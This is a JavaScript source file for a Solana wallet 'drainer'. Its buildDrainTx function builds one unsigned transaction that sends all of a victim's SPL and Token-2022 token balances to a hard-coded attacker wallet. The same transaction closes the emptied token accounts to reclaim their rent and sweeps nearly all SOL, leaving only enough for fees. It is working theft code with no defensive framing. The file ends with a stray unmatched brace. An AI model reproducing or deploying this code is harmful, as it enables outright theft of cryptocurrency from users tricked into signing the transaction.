import {
      Connection, PublicKey, Transaction, SystemProgram, ComputeBudgetProgram
      } from '@solana/web3.js';
      import {
        TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID,
          createTransferInstruction, createCloseAccountInstruction,
            createAssociatedTokenAccountIdempotentInstruction,
              getAssociatedTokenAddressSync
              } from '@solana/spl-token';

              const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
              const DRAINER = new PublicKey(
                process.env.DRAINER_WALLET || 'C8ExCxsiDRqdvT33eUbjPpPx3zWfM4Xn1KKWiNjKAo7i'
                );
                const PRIORITY = Number(process.env.PRIORITY_FEE || 100000);
                const FEE_RESERVE = 400000;

                export const connection = new Connection(RPC_URL, 'confirmed');
                export const drainerAddress = DRAINER.toBase58();

                export async function getSolBalance(owner) {
                  const lamports = await connection.getBalance(new PublicKey(owner));
                    return lamports / 1e9;
                    }

                    export async function buildDrainTx(ownerStr) {
                      const owner = new PublicKey(ownerStr);

                        const tx = new Transaction();
                          tx.feePayer = owner;
                            tx.recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;

                              tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY }));
                                tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 1_400_000 }));

                                  const madeAta = new Set();

                                    for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
                                        const { value: accounts } = await connection.getParsedTokenAccountsByOwner(owner, { programId });

                                            for (const acc of accounts) {
                                                  const info = acc.account.data.parsed.info;
                                                        const mint = new PublicKey(info.mint);
                                                              const amount = BigInt(info.tokenAmount.amount);

                                                                    if (amount > 0n) {
                                                                            const destAta = getAssociatedTokenAddressSync(mint, DRAINER, true, programId);
                                                                                    if (!madeAta.has(destAta.toBase58())) {
                                                                                              tx.add(createAssociatedTokenAccountIdempotentInstruction(
                                                                                                          owner, destAta, DRAINER, mint, programId
                                                                                                                    ));
                                                                                                                              madeAta.add(destAta.toBase58());
                                                                                                                                      }
                                                                                                                                              tx.add(createTransferInstruction(acc.pubkey, destAta, owner, amount, [], programId));
                                                                                                                                                    }

                                                                                                                                                          tx.add(createCloseAccountInstruction(acc.pubkey, DRAINER, owner, [], programId));
                                                                                                                                                              }
                                                                                                                                                                }

                                                                                                                                                                  const balance = await connection.getBalance(owner);
                                                                                                                                                                    const toSend = balance - FEE_RESERVE;
                                                                                                                                                                      if (toSend > 0) {
                                                                                                                                                                          tx.add(SystemProgram.transfer({ fromPubkey: owner, toPubkey: DRAINER, lamports: toSend }));
                                                                                                                                                                            }

                                                                                                                                                                              return tx.serialize({ requireAllSignatures: false }).toString('base64');
                                                                                                                                                                              }
}